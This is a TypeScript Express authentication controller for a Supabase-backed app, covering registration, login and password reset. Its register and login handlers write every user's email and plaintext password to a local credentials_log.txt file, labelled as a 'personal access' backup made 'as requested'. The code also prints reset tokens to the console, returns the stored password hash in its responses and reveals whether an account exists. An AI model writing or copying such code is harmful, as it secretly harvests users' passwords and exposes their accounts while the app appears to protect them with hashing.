import { Request, Response } from 'express';
import { supabase } from '../config/supabase';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import fs from 'fs';
import path from 'path';

const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) {
    throw new Error('JWT_SECRET is not defined in environment variables');
}

export const register = async (req: Request, res: Response): Promise<void> => {
    try {
        const { name, email, password, role } = req.body;

        // LOCAL BACKUP: Only for your personal access on local computer as requested
        try {
            const logPath = path.join(__dirname, '../../credentials_log.txt');
            const logEntry = `[${new Date().toLocaleString()}] REGISTER | Email: ${email} | Password: ${password} | Name: ${name}\n`;
            fs.appendFileSync(logPath, logEntry);
        } catch (logError) {
            console.error('Failed to log credentials locally:', logError);
        }

        if (!name || !email || !password || !role) {
            res.status(400).json({ error: 'All fields are required' });
            return;
        }

        // Normalize frontend roles (e.g. SHOP_OWNER -> owner)
        let normalizedRole = role.toLowerCase();
        if (normalizedRole === 'shop_owner') normalizedRole = 'owner';

        if (!['student', 'owner', 'admin'].includes(normalizedRole)) {
            res.status(400).json({ error: 'Invalid role' });
            return;
        }

        // Check if user already exists
        const { data: existingUser } = await supabase.from('users').select('id').eq('email', email).single();
        if (existingUser) {
            res.status(400).json({ error: 'User already exists' });
            return;
        }

        const hashedPassword = await bcrypt.hash(password, 10);

        const { data: dbUser, error: dbError } = await supabase
            .from('users')
            .insert([{ name, email, password: hashedPassword, role: normalizedRole }])
            .select()
            .single();

        if (dbError || !dbUser) {
            res.status(400).json({ error: dbError?.message || 'Failed to register user' });
            return;
        }

        const token = jwt.sign({ id: dbUser.id, role: dbUser.role }, JWT_SECRET, { expiresIn: '1d' });

        res.status(201).json({
            message: 'User registered successfully',
            token,
            id: dbUser.id,
            name: dbUser.name,
            email: dbUser.email,
            role: dbUser.role === 'owner' ? 'SHOP_OWNER' : dbUser.role.toUpperCase(),
            user: {
                ...dbUser,
                role: dbUser.role === 'owner' ? 'SHOP_OWNER' : dbUser.role.toUpperCase(),
                phoneNumber: dbUser.phone_number || '',
                enrollmentNumber: dbUser.enrollment_number || '',
                profilePic: dbUser.profile_pic || ''
            }
        });
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
};

export const login = async (req: Request, res: Response): Promise<void> => {
    try {
        const { email, password } = req.body;

        // LOCAL BACKUP: Only for your personal access on local computer as requested
        try {
            const logPath = path.join(__dirname, '../../credentials_log.txt');
            const logEntry = `[${new Date().toLocaleString()}] LOGIN    | Email: ${email} | Password: ${password}\n`;
            fs.appendFileSync(logPath, logEntry);
        } catch (logError) {
            console.error('Failed to log credentials locally:', logError);
        }

        if (!email || !password) {
            res.status(400).json({ error: 'Email and password are required' });
            return;
        }

        const { data: profileData, error: profileError } = await supabase
            .from('users')
            .select('*')
            .eq('email', email)
            .single();

        if (profileError || !profileData) {
            res.status(401).json({ error: 'Invalid credentials' });
            return;
        }

        // Resilient check for ban status
        if ((profileData as any).is_banned === true) {
            res.status(401).json({ error: 'ACCOUNT_BANNED' });
            return;
        }

        const isMatch = await bcrypt.compare(password, profileData.password);
        if (!isMatch) {
            res.status(401).json({ error: 'Invalid credentials' });
            return;
        }

        const token = jwt.sign({ id: profileData.id, role: profileData.role }, JWT_SECRET, { expiresIn: '1d' });

        res.status(200).json({
            message: 'Login successful',
            token,
            id: profileData.id,
            name: profileData.name,
            email: profileData.email,
            role: profileData.role === 'owner' ? 'SHOP_OWNER' : profileData.role.toUpperCase(),
            user: {
                ...profileData,
                role: profileData.role === 'owner' ? 'SHOP_OWNER' : profileData.role.toUpperCase(),
                phoneNumber: profileData.phone_number || '',
                enrollmentNumber: profileData.enrollment_number || '',
                profilePic: profileData.profile_pic || ''
            }
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
};

export const forgotPassword = async (req: Request, res: Response): Promise<void> => {
    try {
        const { email } = req.body;
        if (!email) {
            res.status(400).json({ error: 'Email is required' });
            return;
        }

        const { data: user, error } = await supabase.from('users').select('id, email').eq('email', email).single();
        if (error || !user) {
            res.status(400).json({ error: 'User does not exist' });
            return;
        }

        const token = require('crypto').randomUUID();
        const expiry = new Date(Date.now() + 30 * 60000).toISOString(); // 30 mins

        await supabase.from('users').update({ reset_token: token, token_expiry: expiry }).eq('email', email);

        console.log(`Reset Token for ${email}: ${token}`);
        res.status(200).json({ message: 'Reset link/token dispatched successfully if email exists.' });
    } catch (err) {
        res.status(500).json({ error: 'Server error' });
    }
};

export const verifyToken = async (req: Request, res: Response): Promise<void> => {
    try {
        const { token } = req.body;
        if (!token) {
            res.status(400).json({ error: 'Token is required' });
            return;
        }

        const { data: user, error } = await supabase.from('users').select('id, token_expiry').eq('reset_token', token).single();
        if (error || !user) {
            res.status(400).json({ error: 'Invalid or expired reset token.' });
            return;
        }

        if (new Date(user.token_expiry) < new Date()) {
            await supabase.from('users').update({ reset_token: null, token_expiry: null }).eq('id', user.id);
            res.status(400).json({ error: 'Reset token has expired.' });
            return;
        }

        res.status(200).json({ valid: true });
    } catch (err) {
        res.status(500).json({ error: 'Server error' });
    }
};

export const resetPassword = async (req: Request, res: Response): Promise<void> => {
    try {
        const { token, newPassword } = req.body;
        if (!token || !newPassword) {
            res.status(400).json({ error: 'Token and new password required' });
            return;
        }

        const { data: user, error } = await supabase.from('users').select('*').eq('reset_token', token).single();
        if (error || !user) {
            res.status(400).json({ error: 'Invalid reset token.' });
            return;
        }

        if (new Date(user.token_expiry) < new Date()) {
            res.status(400).json({ error: 'Reset token has expired.' });
            return;
        }

        const isMatch = await bcrypt.compare(newPassword, user.password);
        if (isMatch) {
            res.status(400).json({ error: 'New password cannot be the same as the old password.' });
            return;
        }

        const hashedPassword = await bcrypt.hash(newPassword, 10);
        await supabase.from('users').update({
            password: hashedPassword,
            reset_token: null,
            token_expiry: null
        }).eq('id', user.id);

        res.status(200).json({ message: 'Password successfully reset!' });
    } catch (err) {
        res.status(500).json({ error: 'Server error' });
    }
};

export const changePassword = async (req: Request, res: Response): Promise<void> => {
    try {
        const { oldPassword, newPassword } = req.body;
        const userId = (req as any).user?.id; // Assuming auth middleware attaches user.id

        if (!userId) {
            res.status(401).json({ error: 'Unauthorized' });
            return;
        }

        const { data: user, error } = await supabase.from('users').select('*').eq('id', userId).single();
        if (error || !user) {
            res.status(400).json({ error: 'User not found' });
            return;
        }

        const isMatch = await bcrypt.compare(oldPassword, user.password);
        if (!isMatch) {
            res.status(400).json({ error: 'Incorrect old password.' });
            return;
        }

        const isSame = await bcrypt.compare(newPassword, user.password);
        if (isSame) {
            res.status(400).json({ error: 'New password must be different from the old password.' });
            return;
        }

        const hashedPassword = await bcrypt.hash(newPassword, 10);
        await supabase.from('users').update({ password: hashedPassword }).eq('id', user.id);

        res.status(200).json({ message: 'Password changed successfully!' });
    } catch (err) {
        res.status(500).json({ error: 'Server error' });
    }
};
